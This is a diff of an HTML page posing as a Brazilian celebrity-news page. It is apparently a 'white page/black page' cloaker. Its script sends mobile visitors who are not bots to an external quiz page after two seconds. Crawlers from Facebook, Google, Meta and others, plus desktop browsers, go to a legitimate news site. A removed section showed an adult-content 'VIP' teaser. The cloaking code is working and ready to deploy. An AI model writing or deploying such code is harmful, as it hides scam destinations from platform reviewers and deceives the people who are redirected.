@@ -1,93 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Últimas Notícias - A Televisão</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
             background: #f5f5f5;
             color: #333;
             line-height: 1.6;
-        }
-        #white-page {
+            padding: 20px;
             max-width: 800px;
             margin: 0 auto;
-            padding: 20px;
-        }
-        #black-page {
-            display: none;
-            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%);
-            color: white;
-            height: 100vh;
             text-align: center;
-            padding: 20px;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .noticia {
-            margin-bottom: 25px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 15px;
         }
         h1 {
             color: #d40000;
             border-bottom: 1px solid #d40000;
             padding-bottom: 10px;
         }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE -->
+    <!-- PÁGINA WHITE (única página) -->
     <div id="white-page">
         <h1>Últimas Notícias</h1>
-        <div class="noticia">
-            <h2>Anitta anuncia nova turnê internacional</h2>
-            <p>A cantora confirmou shows na Europa e EUA para 2024...</p>
-        </div>
-        <div class="noticia">
-            <h2>Whindersson Nunes lança novo especial</h2>
-            <p>Humorista estreia na Netflix nesta sexta-feira...</p>
-        </div>
-        <p><small>Fonte: <a href="https://www.atelevisao.com" style="color: #666;">A Televisão</a></small></p>
+        <p>Carregando conteúdo exclusivo...</p>
     </div>
 
-    <!-- PÁGINA BLACK -->
-    <div id="black-page" class="hidden">
-        <h1>🔞 CONTEÚDO EXCLUSIVO</h1>
-        <p>Redirecionando para a área VIP...</p>
-    </div>
-
+    <!-- SCRIPT OTIMIZADO -->
     <script>
-        // Função para verificar se é humano (mobile e não é bot)
-        function isHuman() {
+        function isHumanMobile() {
             const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
             return isMobile && !isBot;
         }
 
-        // Fluxo principal
-        if (isHuman()) {
-            // Humanos (mobile): Mostra black page e redireciona após 3s
+        // Redirecionamento direto para mobile (sem black page)
+        if (isHumanMobile()) {
             setTimeout(() => {
-                document.getElementById('white-page').classList.add('hidden');
-                document.getElementById('black-page').classList.remove('hidden');
-                setTimeout(() => {
-                    window.location.href = "https://avelino-star.github.io/Quiz/";
-                }, 3000);
-            }, 1000);
+                window.location.href = "https://avelino-star.github.io/Quiz/";
+            }, 2000); // 2 segundos
         } else {
-            // Bots/PCs: Redireciona para atelevisao.com após 3s
             setTimeout(() => {
                 window.location.href = "https://www.atelevisao.com";
-            }, 3000);
+            }, 3000); // 3 segundos
         }
     </script>
 </body>
